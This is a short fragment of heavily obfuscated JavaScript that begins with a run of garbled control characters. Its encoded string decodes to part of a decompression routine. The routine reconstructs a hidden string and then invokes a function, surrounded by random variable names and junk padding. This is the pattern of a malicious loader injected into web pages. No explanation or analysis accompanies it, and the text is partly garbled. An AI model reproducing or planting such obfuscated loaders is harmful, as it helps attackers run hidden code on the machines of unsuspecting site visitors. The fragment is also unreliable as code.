^\rbEj^_e__^)^+0^-{]_Io_K_Yt\n~o^=^>^?^@^A^B^C^D^E~~a^H^I^J^K^L^M^N^O^P^Q^R^S^T^U^V^W^X^Y^Z^[^\\^]^^^_^`^a^L^F^d^e^f^g^h^i^j~d';gha6W+=  '%30%2C%31%29%3B%6C%31%5B%5Fl%5D%3D%6C%30%5B%49l%5D%3Bif%28l%32%29%7Bl\151%2B%3D%6C%30%5BIl%5D%7D%3B%62\162%65%61k%3B%64efa\165%6Ct%3A\154%31%5B%5F\154%5D%3D\154%30%5B\154%37%5B%5Fl%5D%5D%3B\151f%28%6C%32%29%7Bli%2B%3D%6C%30%5Bl%37%5B%5Fl%5D%5D%7D%3B%6C%30%5BI%6C%5D%3D\154%30%5B\154l%5D%2BS\164r\151n%67%28\154%30%5Bl%37%5B%5F%6C%5D%5D%29%2Es\165b%73%74\162%28%30%2C%31%29%3Bb%72e\141\153%7D%3B\111%6C%2B%2B%3Bl\154%3Dl%37%5B%5F%6C%5D%3B%5Fl%2B%2B%7D%3Bi\146%28%21%6C%32%29%7B\162et%75\162\156%28%6C%31%2Ej\157%69n%28%27%27%29%29%7De%6Cs\145%7B\162\145t%75\162n%20\154\151%7D%7D%3Bvar%20lO%3D%27%27%3B\146\157%72%28%69i%3D%30%3B\151i%3C%72%32\142%6D%63%35%35%32N\113%34%32%34\112%2E%6Ce\156\147%74h%3Bi%69%2B%2B%29%7B\154\117%2B%3Dl%33%28r%32%62%6Dc%35%35%32%4EK%34%32%34\112%5B\151%69%5D%29%7D%3B%65d%35b%38ac%36c%28%29%3B';hu43I1F09cRYL      ='qUrJuFxIPdEDRUOvEGOqVJOFOOPOwOVGbZOIsOOCcOorOcwDb';yCdw5y03M='qhc6z8Q7bH2bf';f83L2g964Al1P5Q3    (cIxQ82d);l1P5Q3f83L2g964A  (gha6W);chxgmh  (gha6W);eM66Cy79a+=  'iXvXBdKUOXXKliSIyuVMXEyTMVHHeBmkNGHDOCdBcuOQgVTIsaTcOZKsNQevyWQYhLVlyOIgvwKeCqJvbHpiNeJTnimKYpmSmibpjOJHK';tcnJwC5S+=  'ieEZR6553eC';
